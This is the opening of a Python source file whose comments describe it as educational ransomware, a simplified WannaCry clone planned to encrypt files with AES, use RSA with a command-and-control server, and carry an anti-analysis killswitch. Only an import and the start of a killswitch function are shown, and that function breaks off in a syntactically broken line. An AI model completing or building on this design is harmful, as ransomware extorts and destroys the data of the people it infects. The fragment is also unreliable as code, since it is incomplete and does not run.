# This is a custom made malware developped for educationnal
# The idea is that it's a simplified version of Wannacry in Python (cause it's the language I know the most)
# It uses somme functionnalities of Wannacry and other ransomwares like encrypting files in AES, then RAS with a C2, Having a killswitch to prevent analysis, ...
# Author : ch4rybd3@protonmail.com

import requests


def killswitch():
    r=requests*